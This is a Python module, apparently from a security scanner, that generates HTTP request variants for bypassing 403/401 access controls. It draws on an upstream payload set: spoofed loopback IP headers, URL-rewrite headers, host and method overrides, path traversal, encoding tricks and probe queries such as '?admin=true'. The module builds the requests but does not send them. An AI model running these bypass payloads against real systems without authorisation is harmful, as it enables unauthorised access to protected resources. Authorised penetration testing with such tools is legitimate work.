"""Deterministic 403/401 variant catalog derived from sangnigege/bypass403.

The upstream project contributes its payload inventory and technique classes
(commit ``d465f2d3``). This module keeps the project-owned execution, evidence,
budget and reporting contracts: it only produces request variants and never
sends them.

The port intentionally stops at the requests-compatible HTTP boundary. Raw
absolute-URI, duplicate-header and CL/TE desynchronisation payloads are source
references, not silently emulated attacks; they need a separate, explicitly
audited transport.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlsplit, urlunsplit

from ...assets import AssetManifest

PAYLOAD_ASSET_ID = "bypass.payloads.upstream"
MODES = frozenset({"quick", "fast", "balanced", "full"})


@dataclass(frozen=True, slots=True)
class ModePolicy:
    """Mode defaults shared by the adapter and the pipeline budget."""

    max_variants: int
    initial_variants: int
    max_requests_per_host: int
    max_total_requests: int


MODE_POLICIES: dict[str, ModePolicy] = {
    "quick": ModePolicy(2, 2, 16, 256),
    "fast": ModePolicy(72, 27, 600, 12000),
    "balanced": ModePolicy(520, 520, 1200, 40000),
    "full": ModePolicy(2600, 2600, 6000, 120000),
}


@dataclass(frozen=True, slots=True)
class Variant:
    url: str
    technique: str
    method: str = "GET"
    headers: dict[str, str] = field(default_factory=dict)
    data: Any = None
    compare_to_root: bool = False
    allow_redirects: bool | None = None
    category: str = ""
    payload: str = ""
    keep_content_type: bool = False


def _variant_key(variant: Variant) -> tuple[Any, ...]:
    body = variant.data if isinstance(variant.data, (str, bytes, type(None))) else repr(variant.data)
    return (
        variant.method.upper(),
        variant.url,
        tuple(sorted((str(key).lower(), str(value)) for key, value in variant.headers.items())),
        body,
        variant.allow_redirects,
        variant.keep_content_type,
    )


def _dedupe(variants: list[Variant]) -> list[Variant]:
    result: list[Variant] = []
    seen: set[tuple[Any, ...]] = set()
    for variant in variants:
        key = _variant_key(variant)
        if key in seen:
            continue
        seen.add(key)
        result.append(variant)
    return result


def _slug(value: Any) -> str:
    text = re.sub(r"[^0-9a-z]+", "-", str(value).lower()).strip("-")
    return text[:48] or "value"


def _with_path(parts, path: str) -> str:
    return urlunsplit((parts.scheme, parts.netloc, path, parts.query, ""))


def _root_url(parts) -> str:
    return urlunsplit((parts.scheme, parts.netloc, "/", "", ""))


def _append_path(parts, suffix: str, technique: str, category: str, *, payload: str = "") -> Variant:
    path = parts.path or "/"
    if suffix.startswith("?"):
        url = urlunsplit((parts.scheme, parts.netloc, path, "", "")) + suffix
    elif suffix.startswith("#"):
        url = _with_path(parts, path) + suffix
    elif suffix.startswith("/"):
        url = _with_path(parts, path.rstrip("/") + suffix)
    else:
        url = _with_path(parts, path + suffix)
    return Variant(url=url, technique=technique, category=category, payload=payload or suffix)


def _prefix_path(parts, prefix: str, technique: str, category: str, *, payload: str = "") -> Variant:
    path = parts.path or "/"
    combined = prefix.rstrip("/") + "/" + path.lstrip("/")
    return Variant(
        url=_with_path(parts, combined),
        technique=technique,
        category=category,
        payload=payload or prefix,
    )


def _query_variant(parts, query: str, technique: str, category: str) -> Variant:
    current = parts.query
    combined = f"{current}&{query}" if current else query
    return Variant(
        url=urlunsplit((parts.scheme, parts.netloc, parts.path or "/", combined, "")),
        technique=technique,
        category=category,
        payload=query,
    )


def _rewrite_variant(
    parts,
    value: str,
    header: str,
    technique: str,
    *,
    category: str = "url-rewrite",
    request_root: bool = True,
) -> Variant:
    return Variant(
        url=_root_url(parts) if request_root else _with_path(parts, parts.path or "/"),
        technique=technique,
        headers={header: value},
        compare_to_root=True,
        category=category,
        payload=value,
    )


def _case_flip_first(path: str) -> str:
    segments = path.split("/")
    for index, segment in enumerate(segments):
        if segment:
            segments[index] = segment.swapcase() if segment.isalpha() else segment[:1].upper() + segment[1:]
            break
    return "/".join(segments)


def _case_variants(path: str) -> list[tuple[str, str]]:
    segments = path.strip("/").split("/")
    result: list[tuple[str, str]] = []
    seen: set[str] = set()
    for index, segment in enumerate(segments):
        if not segment:
            continue
        candidates = {
            "upper": segment.upper(),
            "lower": segment.lower(),
            "capitalize": segment.capitalize(),
            "swapcase": segment.swapcase(),
            "first-upper": segment[:1].upper() + segment[1:],
        }
        for style, replacement in candidates.items():
            changed = segments[:]
            changed[index] = replacement
            new_path = "/" + "/".join(changed)
            if new_path == path or new_path in seen:
                continue
            seen.add(new_path)
            result.append((new_path, f"{index + 1}-{style}"))
    return result


def _encode_first(path: str, *, double: bool = False, lowercase: bool = False) -> str:
    pattern = "%25" if double else "%"
    for index, character in enumerate(path):
        if character.isalpha():
            encoded = pattern + format(ord(character), "02x" if lowercase else "02X")
            return path[:index] + encoded + path[index + 1 :]
    return path


def _double_encode_last(path: str, *, full_segment: bool) -> str:
    parent, separator, last = path.rpartition("/")
    if not separator or not last:
        return path
    if full_segment:
        encoded = "".join(f"%25{ord(character):02X}" for character in last)
    else:
        encoded = last[:-1] + f"%25{ord(last[-1]):02X}"
    return f"{parent}/{encoded}"


class BypassCatalog:
    """Build mode-specific variants from the manifest-backed upstream payloads."""

    def __init__(self, manifest: AssetManifest | None = None) -> None:
        self.manifest = manifest or AssetManifest()
        self.payloads = json.loads(self.manifest.resolve(PAYLOAD_ASSET_ID).read_text(encoding="utf-8"))
        self.source = str(self.payloads.get("source", "sangnigege/bypass403"))

    def variants(self, url: str, mode: str) -> list[Variant]:
        if mode not in MODES:
            raise ValueError(f"unsupported bypass mode: {mode}")
        parts = urlsplit(url)
        target_path = (parts.path or "/") + (("?" + parts.query) if parts.query else "")
        core = self._core(parts, target_path)
        if mode == "quick":
            return _dedupe(core)[: MODE_POLICIES["quick"].max_variants]
        if mode == "fast":
            return _dedupe(core)[: MODE_POLICIES["fast"].max_variants]
        balanced = _dedupe(core + self._balanced(parts, target_path))
        balanced = balanced[: MODE_POLICIES["balanced"].max_variants]
        if mode == "balanced":
            return balanced
        return _dedupe(balanced + self._full_only(parts))[: MODE_POLICIES["full"].max_variants]

    def _core(self, parts, target_path: str) -> list[Variant]:
        path = parts.path or "/"
        host = (parts.hostname or "").rstrip(".")
        host_dot = f"{host}." if host else "localhost."
        return [
            Variant(
                url=_with_path(parts, path),
                technique="xff-loopback",
                headers={"X-Forwarded-For": "127.0.0.1"},
                category="ip-spoof",
            ),
            _append_path(parts, "/", "trailing-slash", "path"),
            _append_path(parts, "%3b", "encoded-semicolon", "path"),
            _append_path(parts, ";", "raw-semicolon", "path"),
            _rewrite_variant(parts, target_path, "X-Original-URL", "x-original-url"),
            _rewrite_variant(parts, target_path, "X-Rewrite-URL", "x-rewrite-url"),
            Variant(url=_with_path(parts, _case_flip_first(path)), technique="case-flip", category="path"),
            _prefix_path(parts, "/%2e/", "prefix-encoded-dot", "path"),
            Variant(
                url=_with_path(parts, path),
                technique="content-type-json",
                headers={"Content-Type": "application/json"},
                category="content-type",
                keep_content_type=True,
            ),
            Variant(
                url=_with_path(parts, path),
                technique="host-localhost",
                headers={"Host": "localhost"},
                category="host",
            ),
            Variant(url=_with_path(parts, path), technique="options-method", method="OPTIONS", category="method"),
            Variant(
                url=_with_path(parts, path),
                technique="method-override-header",
                method="POST",
                headers={"X-HTTP-Method-Override": "PUT"},
                category="method-override",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-real-ip",
                headers={"X-Real-IP": "127.0.0.1"},
                category="ip-spoof",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-forwarded-proto-http",
                headers={"X-Forwarded-Proto": "http"},
                category="proto",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="host-trailing-dot",
                headers={"Host": host_dot},
                category="host",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="user-agent-googlebot",
                headers={"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
                category="user-agent",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="forwarded-loopback",
                headers={"Forwarded": "for=127.0.0.1;proto=https;host=localhost"},
                category="forwarded",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="dual-url-header-confusion",
                headers={"X-Original-URL": target_path, "X-Rewrite-URL": target_path},
                compare_to_root=True,
                category="header-confusion",
            ),
            Variant(url=_with_path(parts, path), technique="post-method", method="POST", category="method"),
            _append_path(parts, ".json", "suffix-json", "path"),
            _append_path(parts, "/*", "wildcard-star", "path"),
            Variant(
                url=_with_path(parts, path),
                technique="hop-by-hop-close",
                headers={"Connection": "close, X-Forwarded-For"},
                category="hop-by-hop",
            ),
            Variant(url=_with_path(parts, path), technique="follow-redirect", allow_redirects=True, category="redirect"),
            Variant(
                url=_with_path(parts, path),
                technique="host-url-combo",
                headers={"X-Forwarded-Host": "127.0.0.1", "X-Original-URL": target_path},
                compare_to_root=True,
                category="header-confusion",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="proto-ssl-combo",
                headers={"X-Forwarded-Proto": "https", "X-Forwarded-Ssl": "on"},
                category="proto",
            ),
            _rewrite_variant(
                parts,
                "/public",
                "X-Original-URL",
                "x-original-public",
                request_root=False,
            ),
            Variant(
                url=_with_path(parts, _encode_first(path, lowercase=True)),
                technique="encoded-first-char",
                category="encoding",
            ),
            _rewrite_variant(
                parts,
                "/public",
                "X-Rewrite-URL",
                "x-rewrite-public",
                request_root=False,
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-forwarded-host",
                headers={"X-Forwarded-Host": "localhost"},
                category="host",
            ),
            Variant(url=_with_path(parts, path), technique="head-method", method="HEAD", category="method"),
            Variant(url=_with_path(parts, path), technique="put-method", method="PUT", category="method"),
            Variant(url=_with_path(parts, path), technique="trace-method", method="TRACE", category="method"),
            Variant(url=_with_path(parts, path), technique="method-case-get", method="gEt", category="method"),
            Variant(
                url=_with_path(parts, path),
                technique="hop-by-hop-real-ip",
                headers={"Connection": "close, X-Real-IP"},
                category="hop-by-hop",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-forwarded-prefix",
                headers={"X-Forwarded-Prefix": target_path},
                category="header-confusion",
            ),
            _query_variant(parts, "_method=PUT", "query-method-override-get", "method-override"),
            Variant(
                url=_query_variant(parts, "_method=PUT", "query-method-override-post", "method-override").url,
                technique="query-method-override-post",
                method="POST",
                category="method-override",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="method-override-form",
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data="_method=PUT",
                category="method-override",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-client-ip-decimal",
                headers={"X-Client-IP": "2130706433"},
                category="ip-spoof",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-originating-ip",
                headers={"X-Originating-IP": "127.0.0.1"},
                category="ip-spoof",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-custom-ip",
                headers={"X-Custom-IP-Authorization": "127.0.0.1"},
                category="ip-spoof",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="true-client-ip",
                headers={"True-Client-IP": "127.0.0.1"},
                category="ip-spoof",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="host-loopback",
                headers={"Host": "127.0.0.1"},
                category="host",
            ),
            _append_path(parts, ".php", "suffix-php", "path"),
            _append_path(parts, ".txt", "suffix-txt", "path"),
            _append_path(parts, ".html", "suffix-html", "path"),
            _append_path(parts, "/..;/", "path-traversal-semicolon", "path"),
            _append_path(parts, "/%252e/", "double-encoded-dot", "encoding"),
            Variant(
                url=_with_path(parts, _encode_first(path, double=True, lowercase=True)),
                technique="double-encoded-first-char",
                category="encoding",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="proto-https-port",
                headers={"X-Forwarded-Proto": "https", "X-Forwarded-Port": "443"},
                category="proto",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="forwarded-ipv6-loopback",
                headers={"Forwarded": 'for="[::1]";proto=https'},
                category="forwarded",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="dual-ip-chain",
                headers={"Client-IP": "127.0.0.1", "Cluster-Client-IP": "127.0.0.1"},
                category="forwarded",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="typo-host",
                headers={"X-Forwared-Host": "127.0.0.1"},
                category="host",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-forwarded-scheme-http",
                headers={"X-Forwarded-Scheme": "http"},
                category="proto",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-forwarded-scheme-https",
                headers={"X-Forwarded-Scheme": "https"},
                category="proto",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="x-host-loopback",
                headers={"X-Host": "127.0.0.1"},
                category="host",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="front-end-https",
                headers={"Front-End-Https": "on"},
                category="proto",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="content-type-xml",
                headers={"Content-Type": "application/xml"},
                category="content-type",
                keep_content_type=True,
            ),
            Variant(
                url=_with_path(parts, path),
                technique="user-agent-curl",
                headers={"User-Agent": "curl/8.17.0"},
                category="user-agent",
            ),
            _prefix_path(parts, "/./", "prefix-dot", "path"),
            _prefix_path(parts, "/%2f/", "prefix-encoded-slash", "path"),
            _append_path(parts, ".randomstring", "wildcard-random", "path"),
            _append_path(parts, "?download=1", "query-download", "path"),
            Variant(
                url=_with_path(parts, path),
                technique="method-override-json",
                method="POST",
                headers={"Content-Type": "application/json"},
                data='{"_method":"PUT"}',
                category="method-override",
            ),
            Variant(
                url=_with_path(parts, path),
                technique="method-override-form-get",
                method="POST",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                data="_method=GET",
                category="method-override",
            ),
        ]

    def _balanced(self, parts, target_path: str) -> list[Variant]:
        path = parts.path or "/"
        target_url = urlunsplit(
            (parts.scheme, parts.netloc, parts.path or "/", parts.query, "")
        )
        variants: list[Variant] = []
        variants.extend(self._upstream_paths(parts, "fast_paths", "fast"))
        for index, prefix in enumerate(self.payloads.get("path_prefixes", []), 1):
            variants.append(
                _prefix_path(parts, str(prefix), f"path-prefix-{index:02d}", "path", payload=str(prefix))
            )
        for suffix in self.payloads.get("extensions", []):
            variants.append(
                _append_path(
                    parts,
                    str(suffix),
                    f"extension-{_slug(suffix)}",
                    "path",
                    payload=str(suffix),
                )
            )
        for index, suffix in enumerate(self.payloads.get("wildcard_suffixes", []), 1):
            variants.append(
                _append_path(parts, str(suffix), f"wildcard-{index:02d}", "path", payload=str(suffix))
            )
        for new_path, label in _case_variants(path):
            variants.append(
                Variant(url=_with_path(parts, new_path), technique=f"case-{label}", category="path")
            )

        core_ip_headers = {
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Originating-IP",
            "X-Client-IP",
            "X-Custom-IP-Authorization",
            "True-Client-IP",
        }
        core_ip_values = [str(value) for value in self.payloads.get("ip_values", [])[:8]]
        for header in self.payloads.get("ip_headers", []):
            header = str(header)
            values = core_ip_values if header in core_ip_headers else ["127.0.0.1"]
            for value in values:
                variants.append(
                    Variant(
                        url=_with_path(parts, path),
                        technique=f"ip-{_slug(header)}-{_slug(value)}",
                        headers={header: value},
                        category="ip-spoof",
                        payload=value,
                    )
                )

        for header in self.payloads.get("url_override_headers", []):
            header = str(header)
            variants.append(
                _rewrite_variant(
                    parts,
                    target_path,
                    header,
                    f"url-override-{_slug(header)}",
                    request_root=False,
                )
            )
        for header in self.payloads.get("url_override_variants", []):
            header = str(header)
            variants.append(
                _rewrite_variant(
                    parts,
                    target_path,
                    header,
                    f"url-alias-{_slug(header)}",
                    request_root=False,
                )
            )

        for header in self.payloads.get("host_override_headers", []):
            header = str(header)
            lower = header.lower()
            if "proto" in lower or "scheme" in lower:
                values = ("http", "https")
            elif "port" in lower:
                values = ("80", "443")
            else:
                values = ("127.0.0.1", "localhost")
            for value in values:
                variants.append(
                    Variant(
                        url=_with_path(parts, path),
                        technique=f"host-{_slug(header)}-{_slug(value)}",
                        headers={header: value},
                        category="host",
                        payload=value,
                    )
                )
        for header, value in self.payloads.get("host_localhost_headers", []):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"host-local-{_slug(header)}-{_slug(value)}",
                    headers={str(header): str(value)},
                    category="host",
                    payload=str(value),
                )
            )
        for header in self.payloads.get("typo_headers", []):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"typo-{_slug(header)}",
                    headers={str(header): "127.0.0.1"},
                    category="host",
                    payload="127.0.0.1",
                )
            )
        for header in self.payloads.get("referer_variants", []):
            header = str(header)
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"referer-{_slug(header)}",
                    headers={header: target_url},
                    category="referer",
                    payload=target_url,
                )
            )
        for header, value in self.payloads.get("host_url_combo", []):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"host-url-{_slug(header)}",
                    headers={str(header): str(value), "X-Original-URL": target_path},
                    compare_to_root=True,
                    category="header-confusion",
                    payload=str(value),
                )
            )

        for content_type in self.payloads.get("content_types", []):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"content-type-{_slug(content_type)}",
                    headers={"Content-Type": str(content_type)},
                    category="content-type",
                    payload=str(content_type),
                    keep_content_type=True,
                )
            )
        for user_agent in self.payloads.get("user_agents", []):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"user-agent-{_slug(user_agent)[:36]}",
                    headers={"User-Agent": str(user_agent)},
                    category="user-agent",
                    payload=str(user_agent),
                )
            )
        for index, hop_headers in enumerate(self.payloads.get("hop_by_hop", []), 1):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"hop-by-hop-{index:02d}",
                    headers={str(key): str(value) for key, value in hop_headers.items()},
                    category="hop-by-hop",
                )
            )

        for method in self.payloads.get("methods", []):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"method-{_slug(method)}",
                    method=str(method),
                    category="method",
                    payload=str(method),
                )
            )
        for method in self.payloads.get("case_switched_methods", []):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"method-case-{_slug(method)}",
                    method=str(method),
                    category="method",
                    payload=str(method),
                )
            )
        for header, value in self.payloads.get("method_override_headers", {}).items():
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"method-override-{_slug(header)}",
                    method="POST",
                    headers={str(header): str(value)},
                    category="method-override",
                    payload=str(value),
                )
            )
        for query in self.payloads.get("method_override_query", []):
            variants.append(
                _append_path(
                    parts,
                    str(query),
                    f"method-query-{_slug(query)}",
                    "method-override",
                    payload=str(query),
                )
            )
        for index, payload in enumerate(self.payloads.get("post_body_tricks", []), 1):
            method, headers = payload
            content_length = str(headers.get("Content-Length", ""))
            if content_length == "0":
                data: Any = b""
            elif content_length == "1":
                data = b" "
            else:
                continue
            extra = {
                str(key): str(value)
                for key, value in headers.items()
                if str(key).lower() != "content-length"
            }
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"post-body-{index:02d}",
                    method=str(method),
                    headers=extra,
                    data=data,
                    category="post-body",
                    payload=content_length,
                )
            )

        for index, pattern in enumerate(self.payloads.get("header_confusion", []), 1):
            headers = {
                str(key): str(value).format(
                    path=target_path.lstrip("/"),
                    url=_root_url(parts),
                    host=parts.netloc,
                )
                for key, value in pattern.items()
            }
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"header-confusion-{index:02d}",
                    headers=headers,
                    compare_to_root=True,
                    category="header-confusion",
                )
            )
        for index, pattern in enumerate(self.payloads.get("forwarded_trust", []), 1):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"forwarded-trust-{index:02d}",
                    headers={str(key): str(value) for key, value in pattern.items()},
                    category="forwarded",
                )
            )
        for index, pattern in enumerate(self.payloads.get("proto_confusion", []), 1):
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"proto-confusion-{index:02d}",
                    headers={str(key): str(value) for key, value in pattern.items()},
                    category="proto",
                )
            )
        for index, payload in enumerate(self.payloads.get("security_header_strip", []), 1):
            headers = {
                str(key): str(value)
                for key, value in payload.items()
                if str(key).lower() != "content-length"
            }
            variants.append(
                Variant(
                    url=_with_path(parts, path),
                    technique=f"security-header-strip-{index:02d}",
                    method="POST",
                    headers=headers,
                    data=b"",
                    category="security-header",
                )
            )

        variants.extend(self._encoding_variants(parts))
        return variants

    def _full_only(self, parts) -> list[Variant]:
        path = parts.path or "/"
        variants: list[Variant] = []
        variants.extend(self._upstream_paths(parts, "all_paths", "full"))
        for header in self.payloads.get("ip_headers", []):
            header = str(header)
            for value in self.payloads.get("ip_values", []):
                value = str(value)
                variants.append(
                    Variant(
                        url=_with_path(parts, path),
                        technique=f"ip-full-{_slug(header)}-{_slug(value)}",
                        headers={header: value},
                        category="ip-spoof",
                        payload=value,
                    )
                )
        return variants

    def _upstream_paths(self, parts, key: str, mode: str) -> list[Variant]:
        variants: list[Variant] = []
        for index, payload in enumerate(self.payloads.get(key, []), 1):
            payload = str(payload)
            if not payload or "#" in payload:
                continue
            variants.append(
                _append_path(
                    parts,
                    payload,
                    f"{mode}-path-{index:03d}",
                    "upstream-path",
                    payload=payload,
                )
            )
        return variants

    def _encoding_variants(self, parts) -> list[Variant]:
        path = parts.path or "/"
        variants: list[Variant] = []
        for technique, new_path in (
            ("double-encode-last", _double_encode_last(path, full_segment=False)),
            ("double-encode-segment", _double_encode_last(path, full_segment=True)),
        ):
            if new_path != path:
                variants.append(
                    Variant(url=_with_path(parts, new_path), technique=technique, category="encoding")
                )

        parent, separator, last = path.rpartition("/")
        if not separator or not last:
            return variants
        for index, encoded_slash in enumerate(
            ("%c0%af", "%c1%9c", "%e0%80%af", "%f0%80%80%af", "%u002f", "%u2215", "%u2044", "%uFF0F"),
            1,
        ):
            variants.append(
                Variant(
                    url=_with_path(parts, f"{parent}{encoded_slash}{last}"),
                    technique=f"unicode-slash-{index:02d}",
                    category="encoding",
                    payload=encoded_slash,
                )
            )
        unicode_segment = "".join(f"%u{ord(character):04X}" for character in last)
        overlong_segment = "".join(f"%c1{0xA0 + (ord(character) & 0x3F):02X}" for character in last)
        variants.append(
            Variant(
                url=_with_path(parts, f"{parent}/{unicode_segment}"),
                technique="unicode-segment",
                category="encoding",
                payload=unicode_segment,
            )
        )
        variants.append(
            Variant(
                url=_with_path(parts, f"{parent}/{overlong_segment}"),
                technique="overlong-segment",
                category="encoding",
                payload=overlong_segment,
            )
        )
        for index, traversal in enumerate(("..%2f", "%2e%2e%2f", "%2e%2e/"), 1):
            variants.append(
                Variant(
                    url=_with_path(parts, f"{parent}/{traversal}{last}"),
                    technique=f"normalization-traversal-{index:02d}",
                    category="encoding",
                    payload=traversal,
                )
            )
        for index, suffix in enumerate((".", "%2e", "..;/", "..;\\"), 1):
            variants.append(
                Variant(
                    url=_with_path(parts, f"{parent}/{last}/{suffix}"),
                    technique=f"normalization-suffix-{index:02d}",
                    category="encoding",
                    payload=suffix,
                )
            )
        variants.append(
            Variant(
                url=_with_path(parts, f"{parent}/;{last}"),
                technique="normalization-semicolon",
                category="encoding",
            )
        )
        for index, prefix in enumerate(("%2e/", ".%2e/", "%2e%2e/"), 1):
            variants.append(
                Variant(
                    url=_with_path(parts, f"{parent}/{prefix}{last}"),
                    technique=f"normalization-prefix-{index:02d}",
                    category="encoding",
                    payload=prefix,
                )
            )

        suffix_tricks = (
            "?download=1",
            "?format=json",
            "?output=1",
            "?admin=true",
            "?user=admin",
            "?detail=true",
            ";?query",
            ".json?query",
            ".css",
            ".js",
            "?wsdl",
            "/application.wadl?detail=true",
            "?debug=true",
        )
        for index, suffix in enumerate(suffix_tricks, 1):
            variants.append(
                _append_path(parts, suffix, f"suffix-trick-{index:02d}", "path", payload=suffix)
            )
        return variants


